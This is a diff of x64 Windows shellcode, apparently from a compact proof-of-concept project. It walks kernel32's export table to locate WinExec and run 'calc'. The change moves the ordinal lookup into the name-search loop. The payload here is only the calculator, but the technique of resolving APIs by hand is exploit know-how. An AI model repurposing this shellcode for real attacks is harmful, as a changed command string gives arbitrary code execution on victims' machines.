@@ -42,16 +42,15 @@ shellcode:
 ; Found export ordinals table (RCX)
     CDQ                                   ; RDX = 0 (eax == userland addresss, so MSB is not set)
 find_winexec_x64:
+; speculatively load ordinal (RBP)
+    MOVZX   EBP, WORD [RCX + RDX * 2]     ; RBP = [ordinals table + (WinExec function number + 1) * 2] = WinExec function ordinal (eventually)
     INC     EDX                           ; RDX = function number + 1
     LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
     CMP     [RDI + RAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
     JNE     find_winexec_x64              ;
-; Found WinExec ordinal (RDX)
-    MOVZX   EDX, WORD [RCX + RDX * 2 - 2]
-                                          ; RDX = [ordinals table + (WinExec function number + 1) * 2 - 2] = WinExec function ordinal
     MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
     ADD     ESI, EDI                      ; RSI = kernel32 + offset(address table) = &(address table)
-    ADD     EDI, [RSI + RDX * 4]          ; RDI = kernel32 + &(address table)[WinExec ordinal] = kernel32 + offset(WinExec) = WinExec
+    ADD     EDI, [RSI + RBP * 4]          ; RDI = kernel32 + &(address table)[WinExec ordinal] = kernel32 + offset(WinExec) = WinExec
 ; Found WinExec (RDI)
     PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
     PUSH    RSP
